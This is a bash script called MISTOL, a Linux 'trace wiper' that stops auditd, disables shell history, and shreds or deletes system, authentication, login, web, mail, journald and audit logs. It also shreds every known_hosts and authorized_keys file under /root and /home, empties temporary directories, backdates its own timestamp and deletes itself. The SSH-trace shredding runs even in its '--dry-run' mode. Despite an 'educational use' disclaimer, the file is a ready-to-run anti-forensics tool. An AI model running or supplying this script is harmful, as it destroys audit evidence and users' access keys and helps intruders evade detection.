#!/bin/bash
#
# -----------------------------------------------------------------------------
#  MISTOL - Linux System Trace Wiper/Cleaner @4quarks
# -----------------------------------------------------------------------------
#  Summary:
#  This script cleans up various traces such as logs, history files, cached data,
#  temporary files, SSH artifacts, and system metadata.
#
#  Usage:
#    $ sudo ./wiper.sh             # Run actual cleanup
#    $ sudo ./wiper.sh --dry-run   # Simulate the cleanup (nothing is deleted)
#
#  Warning:
#    This code is for for educational and authorized use only. Do not use on 
#    systems you do not own or have explicit permission to operate on.
#

echo """
 __  __ _____  _____ _______ ____  _      
|  \/  |_   _|/ ____|__   __/ __ \| |     
| \  / | | | | (___    | | | |  | | |     
| |\/| | | |  \___ \   | | | |  | | |     
| |  | |_| |_ ____) |  | | | |__| | |____ 
|_|  |_|_____|_____/   |_|  \____/|______|
                                          
           MISTOL - Wiping Linux Logs      
"""                             

for arg in "$@"; do
  if [[ "$arg" == "--dry-run" ]]; then
    DRY_RUN=true
  fi
done

# Define cleanup function
clean_paths() {
  local group="$1"
  shift
  echo "[*] Cleaning group: $group"

  for pattern in "$@"; do
    # Expand globs (for absolute paths) or search by name (if relative pattern)
    if [[ "$pattern" == /* ]]; then
      files=( $(eval ls -d $pattern 2>/dev/null) )
    else
      files=( $(find / -name "$pattern" 2>/dev/null) )
    fi

    for f in "${files[@]}"; do
      if [ -f "$f" ]; then
        if [ "$DRY_RUN" = true ]; then 
          echo "  [DRY-RUN] Would shred & delete: $f"
        else
          echo "  [-] Shredding file: $f"
          shred -zun 3 "$f" || > "$f"
          rm -f "$f"
        fi
      elif [ -d "$f" ]; then
        if [ "$DRY_RUN" = true ]; then
          echo "  [DRY-RUN] Would remove dir: $f"
        else
          echo "  [-] Removing directory: $f"
          rm -rf "$f"
        fi
      fi
    done
  done
}


# Define paths
CORE_LOGS=(/var/log/auth.log /var/log/secure /var/log/messages /var/log/syslog /var/log/user.log /var/log/wtmp /var/log/utmp /var/run/utmp /etc/wtmp /etc/utmp /var/log/lastlog)
SHELL_HISTORY=(*_history .history .login .logout .bash_logout)
DAEMON_LOGS=(/var/log/dpkg.log /var/log/yum.log /var/log/dnf*.log /var/log/daemon/*.log /var/log/daemons/*.log /var/log/kern.log /var/log/acct /var/account/pacct)
APP_LOGS=(/var/log/qmail /var/log/smtpd /var/log/mail.log /var/log/mail/errors.log /etc/mail/access /var/log/apache2/*.log /var/log/httpd/*.log /etc/httpd/logs/*.log /usr/local/apache/logs/* /var/log/nginx/*.log /var/log/proftpd/* /var/log/xferlog /var/log/cups/* /var/log/thttpd_log)
MISC_LOGS=(/var/log/news/* /var/log/news.* /var/log/poplog /var/log/spooler /var/log/bandwidth /var/log/explanations /var/log/ncftpd/misclog.txt)
CRON_PATHS=(/var/log/cron/*)
TEMP_DIRS=(/tmp/* /var/tmp/* /dev/shm/*)
USER_TRACES=(.cache .local/share/recently-used.xbel .config/gtk-3.0/bookmarks .Xauthority, .git/logs)

# Wiper function
cleanup_and_exit() {
  # Ensure script is run as root
  if [ "$EUID" -ne 0 ]; then
    echo "[-] This script must be run as root!"
    exit 1
  fi
  
  # Stopping auditd only if systemd is available
  if command -v systemctl &>/dev/null && pidof systemd &>/dev/null; then
    systemctl stop auditd 2>/dev/null
  fi
  
  # Disable all history tracking 
  unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHST
  export HISTSIZE=0
  history -c
  history -w
  
  # Capture session info
  MY_TTY=$(tty)
  MY_USER=$(whoami)
  
  echo "[*] Stealth shell started on $MY_TTY as $MY_USER"
  echo "[*] Running cleanup..."

  clean_paths "Core Logs" "${CORE_LOGS[@]}"
  clean_paths "Shell History" "${SHELL_HISTORY[@]}"
  clean_paths "Daemon Logs" "${DAEMON_LOGS[@]}"
  clean_paths "App/Web/Mail Logs" "${APP_LOGS[@]}"
  clean_paths "Legacy/Misc Logs" "${MISC_LOGS[@]}"
  clean_paths "Crontab Files" "${CRON_PATHS[@]}"
  clean_paths "Temporary Directories" "${TEMP_DIRS[@]}"
  clean_paths "User Traces" "${USER_TRACES[@]}"

  echo "[*] Removing SSH traces..."
  find /root /home -name known_hosts -exec shred -zun 3 {} \; -exec rm -f {} \; 2>/dev/null
  find /root /home -name authorized_keys -exec shred -zun 3 {} \; -exec rm -f {} \; 2>/dev/null

  echo "[*] Removing journald and audit logs..."
  [[ "$DRY_RUN" != true ]] && rm -rf /var/log/auditd/* /var/log/audit/* /var/log/journal/* /run/log/journal/*

  touch -d "2023-01-01 00:00:00" "$0" 2>/dev/null
  echo "[+] Trace cleanup complete - $(date)"
}

# Cleanup on shell exit
trap cleanup_and_exit EXIT

echo "[+] Wiping myself. Ciao!"
(sleep 1; unlink "$0") &
